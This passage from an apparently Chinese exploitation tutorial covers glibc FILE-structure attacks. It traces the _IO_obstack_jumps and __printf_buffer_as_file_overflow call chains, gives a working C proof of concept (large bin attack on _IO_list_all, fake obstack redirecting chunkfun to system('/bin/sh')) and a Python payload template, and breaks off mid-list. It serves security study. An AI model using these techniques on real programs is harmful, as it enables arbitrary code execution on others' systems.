size);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> _IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment">     space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n); <span class="comment">//执行此函数</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数中的<code>_IO_obstack_file</code>只是在<code>_IO_FILE_plus</code>后面加了一个<code>obstack</code>的指针。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>简单绕过一些内容后用运行到<code>obstack_grow</code>处，来调用<code>_obstack_newchunk</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">        obstack_grow(obstack, data, n);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)				      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       int __len = (length);						      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, __len);				      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);				      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;						      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line"> 替换:  </span><br><span class="line">        (&#123;</span><br><span class="line">            <span class="keyword">struct</span> obstack *__o = (obstack);</span><br><span class="line">            <span class="type">int</span> __len = (n);</span><br><span class="line">            <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, __len);</span><br><span class="line">            <span class="built_in">memcpy</span>(__o-&gt;next_free, data, __len);</span><br><span class="line">            __o-&gt;next_free += __len;</span><br><span class="line">            (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></div>

<p>之后触发<code>CALL_CHUNKFUN</code></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _obstack_newchunk(<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">    <span class="type">long</span> new_size;</span><br><span class="line">    <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> already;</span><br><span class="line">    <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">    new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">        new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">    new_chunk = CALL_CHUNKFUN(h, new_size); <span class="comment">// 调用函数位置</span></span><br><span class="line">    ...</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><code>CALL_CHUNKFUN</code>宏实际上是使用了结构体中的指针<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，并且第一个参数可控，同时需要保证<code>(((h)-&gt;use_extra_arg)</code>为1</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">new_chunk = CALL_CHUNKFUN(h, new_size);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_CHUNKFUN(h, size)                          \</span></span><br><span class="line"><span class="meta">    (((h)-&gt;use_extra_arg)                               \</span></span><br><span class="line"><span class="meta">             ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size)) \</span></span><br><span class="line"><span class="meta">             : (*(struct _obstack_chunk * (*) (long) )(h)-&gt;chunkfun)((size)))</span></span><br><span class="line">替换:  </span><br><span class="line">(((h)-&gt;use_extra_arg) ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (new_size)) : (*(<span class="keyword">struct</span> _obstack_chunk *(*) (<span class="type">long</span>) )(h)-&gt;chunkfun)((new_size)))</span><br></pre></td></tr></table></figure></div>

<p>因此可以按下图所示方法构造：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/f2d3f8634e9f15a5b53e2cea36f32bc8.png"
                      alt="在这里插入图片描述"
                ><br><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_qspp" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *fake_IO_obstack_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_obstack = fake_IO_obstack_file + <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_obstack_jumps = libc_base + <span class="number">0x1ce420</span>;</span><br><span class="line"></span><br><span class="line">    fake_IO_obstack_file[<span class="number">4</span>] = <span class="number">0</span>;                       <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">5</span>] = <span class="number">1</span>;                       <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">27</span>] = IO_obstack_jumps + <span class="number">0x20</span>;<span class="comment">// vtable</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">28</span>] = (<span class="type">size_t</span>) fake_obstack;  <span class="comment">//obstack</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;fake_IO_obstack_file[<span class="number">29</span>], <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_obstack[<span class="number">7</span>] = (<span class="type">size_t</span>) system;                   <span class="comment">//chunkfun -&gt; system</span></span><br><span class="line">    fake_obstack[<span class="number">9</span>] = (<span class="type">size_t</span>) &amp;fake_IO_obstack_file[<span class="number">29</span>];<span class="comment">//extra_arg -&gt; &quot;/bin/sh&quot;</span></span><br><span class="line">    fake_obstack[<span class="number">10</span>] |= <span class="number">1</span>;                               <span class="comment">//use_extra_arg = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>攻击模板如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">fake_io_addr = heap_addr + <span class="number">0x1390</span></span><br><span class="line">obstack_ptr = fake_io_addr + <span class="number">0x30</span></span><br><span class="line">fake_io_file = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0x58</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(system_addr)  <span class="comment"># 需要执行的函数</span></span><br><span class="line">fake_io_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_io_file += p64(fake_io_addr+<span class="number">0xe8</span>)  <span class="comment"># 执行函数的 rdi</span></span><br><span class="line">fake_io_file += p64(<span class="number">1</span>)  <span class="comment"># obstack-&gt;use_extra_arg=1</span></span><br><span class="line">fake_io_file += p64(heap_addr+<span class="number">0x2000</span>)  <span class="comment"># _IO_lock_t *_lock;</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_io_file += p64(IO_obstack_jumps_addr + <span class="number">0x20</span>)  <span class="comment"># 触发 _IO_obstack_xsputn;</span></span><br><span class="line">fake_io_file += p64(obstack_ptr)  <span class="comment"># struct obstack *obstack</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(fake_io_file))) <span class="comment"># 因为是largebin attack 所以: 0xd8=0xe8-0x10</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 执行函数的 rdi 的地址所存储的内容</span></span><br><span class="line">payload = fake_io_file+ <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="House-of-Snake"><a href="#House-of-Snake" class="headerlink" title="House of Snake"></a>House of Snake</h2><p>glibc-2.37 删除了 <code>_IO_obstack_jumps</code> 但是添加了 <code>_IO_printf_buffer_as_file_jumps</code> 这个新的 <code>_IO_jumps_t</code> 结构体。 <code>_IO_printf_buffer_as_file_jumps</code> 中只有 <code>__printf_buffer_as_file_overflow</code> 和 <code>__printf_buffer_as_file_xsputn</code> 两个函数，而 House of Snake 利用的是 <code>__printf_buffer_as_file_overflow</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_printf_buffer_as_file_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, __printf_buffer_as_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, __printf_buffer_as_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>__printf_buffer_as_file_overflow</code> 函数定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> __attribute_warn_unused_result__</span><br><span class="line">__printf_buffer_has_failed(<span class="keyword">struct</span> __printf_buffer *buf) &#123;</span><br><span class="line">    <span class="keyword">return</span> buf-&gt;mode == __printf_buffer_mode_failed;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">__printf_buffer_as_file_overflow(FILE *fp, <span class="type">int</span> ch) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span> *<span class="title">file</span> =</span> (<span class="keyword">struct</span> __printf_buffer_as_file *) fp;</span><br><span class="line"></span><br><span class="line">    __printf_buffer_as_file_commit(file);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* EOF means only a flush is requested.   */</span></span><br><span class="line">    <span class="keyword">if</span> (ch != EOF)</span><br><span class="line">        __printf_buffer_putc(file-&gt;next, ch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure that flushing actually produces room.  */</span></span><br><span class="line">    <span class="keyword">if</span> (!__printf_buffer_has_failed(file-&gt;next)</span><br><span class="line">        &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end)</span><br><span class="line">        __printf_buffer_flush(file-&gt;next);</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先 <code>__printf_buffer_as_file_overflow </code> 函数将 <code>FILE</code> 结构体转换为 <code>__printf_buffer_as_file</code> 类型，相关定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *write_base;</span><br><span class="line">  <span class="type">char</span> *write_ptr;</span><br><span class="line">  <span class="type">char</span> *write_end;</span><br><span class="line">  <span class="type">uint64_t</span> written;</span><br><span class="line">  <span class="class"><span class="keyword">enum</span> __<span class="title">printf_buffer_mode</span> <span class="title">mode</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_as_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Interface to libio.  */</span></span><br><span class="line">  FILE stream;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Pointer to the underlying buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>之后调用了 <code>__printf_buffer_as_file_commit</code> ，该函数做了一些检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_as_file_commit (<span class="keyword">struct</span> __printf_buffer_as_file *file)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Check that the write pointers in the file stream are consistent</span></span><br><span class="line"><span class="comment">     with the next buffer.  */</span></span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr);</span><br><span class="line">  assert (file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end);</span><br><span class="line">  assert (file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base);</span><br><span class="line">  assert (file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end);</span><br><span class="line"></span><br><span class="line">  file-&gt;next-&gt;write_ptr = file-&gt;stream._IO_write_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后根据参数 <code>ch</code> 是否为 <code>EOF</code> 决定是否调用 <code>__printf_buffer_putc</code> 。FSOP 中调用的 <code>_IO_flush_all_lockp</code> 函数中是通过 <code>_IO_OVERFLOW (fp, EOF)</code> 调用到 <code>vtable</code> 中的 <code>overflow</code> 函数，因此 <code>__printf_buffer_as_file_overflow</code> 的参数 <code>ch</code> 为 <code>EOF</code> 。 当然，即使调用到了 <code>__printf_buffer_putc</code> 也只是是做了一些指针记录的数值加减的操作，对此我们不用过多关注。</p>
<p>再之后会调用 <code>__printf_buffer_flush</code> 函数，调用条件是 <code>file-&gt;next.mode != __printf_buffer_mode_failed</code> 且 <code>file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code> 。</p>
<p><code>__printf_buffer_flush</code> 函数定义如下，这里再次检查 <code>file-&gt;next.mode != __printf_buffer_mode_failed</code> 然后调用 <code>__printf_buffer_do_flush</code> 函数，参数为 <code>file-&gt;next</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf(n) __printf_##n</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer_flush Xprintf (buffer_flush)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Xprintf_buffer Xprintf (buffer)</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span></span><br><span class="line"><span class="title function_">Xprintf_buffer_flush</span> <span class="params">(<span class="keyword">struct</span> Xprintf_buffer *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (Xprintf_buffer_has_failed (buf)))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  Xprintf (buffer_do_flush) (buf); <span class="comment">// __printf_buffer_do_flush(buf)</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>如果 <code>file-&gt;next.mode = __printf_buffer_mode_obstack(11)</code> 那么会调用 <code>__printf_buffer_flush_obstack</code> 函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__printf_buffer_do_flush (<span class="keyword">struct</span> __printf_buffer *buf)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> (buf-&gt;mode)</span><br><span class="line">    &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> __printf_buffer_mode_obstack:</span><br><span class="line">      __printf_buffer_flush_obstack ((<span class="keyword">struct</span> __printf_buffer_obstack *) buf);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里 <code>__printf_buffer_obstack</code> 结构体定义如下： </p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer_obstack</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">printf_buffer</span> <span class="title">base</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">  <span class="type">char</span> ch;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>如果满足 <code>buf-&gt;base.write_ptr == &amp;buf-&gt;ch + 1</code> 则 <code>__printf_buffer_flush_obstack</code> 会执行 <code>obstack_1grow</code> 宏。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__printf_buffer_flush_obstack (<span class="keyword">struct</span> __printf_buffer_obstack *buf)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;base.write_ptr == &amp;buf-&gt;ch + <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      obstack_1grow (buf-&gt;obstack, buf-&gt;ch);</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p> <code>obstack_1grow</code> 宏展开内容如下，可以看到该宏调用了 <code>_obstack_newchunk</code> 函数并将 <code>buf-&gt;obstack</code> 作为参数传入。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">声明位置: obstack.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_1grow(OBSTACK, datum)                          \</span></span><br><span class="line"><span class="meta">  __extension__                                      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                          \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + 1 &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, 1);                          \</span></span><br><span class="line"><span class="meta">       obstack_1grow_fast (__o, datum);                          \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line">替换:  </span><br><span class="line">(&#123;</span><br><span class="line">    <span class="keyword">struct</span> obstack *__o = (buf-&gt;obstack);</span><br><span class="line">    <span class="keyword">if</span> (__o-&gt;next_free + <span class="number">1</span> &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, <span class="number">1</span>);</span><br><span class="line">    (*((__o)-&gt;next_free)++ = (buf-&gt;ch));</span><br><span class="line">    (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div>
<p><code>_obstack_newchunk</code> 函数会执行 <code>CALL_CHUNKFUN</code> 宏，这和前面的 House of 琴瑟琵琶利用链相同。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">  ...</span><br><span class="line">  new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>回顾一下整个分析过程并将所有相关结构体，并都看成 <code>__printf_buffer_as_file</code> 结构体，有以下条件：</p>
<ul>
<li>在 <code>__printf_buffer_as_file_overflow</code> 函数中：<ul>
<li><code>file-&gt;next-&gt;mode!=__printf_buffer_mode_failed &amp;&amp; file-&gt;next-&gt;write_ptr == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li>在 <code>__printf_buffer_as_file_commit</code> 函数中：<ul>
<li><code>file-&gt;stream._IO_write_ptr &gt;= file-&gt;next-&gt;write_ptr</code></li>
<li><code>file-&gt;stream._IO_write_ptr &lt;= file-&gt;next-&gt;write_end</code></li>
<li><code>file-&gt;stream._IO_write_base == file-&gt;next-&gt;write_base</code></li>
<li><code>file-&gt;stream._IO_write_end == file-&gt;next-&gt;write_end</code></li>
</ul>
</li>
<li>在 <code>__printf_buffer_flush</code> 函数中：<ul>
<li><code>file-&gt;next-&gt;mode =__printf_buffer_mode_obstack</code></li>
</ul>
</li>
<li>在 <code>__printf_buffer_flush_obstack</code> 函数中：<ul>
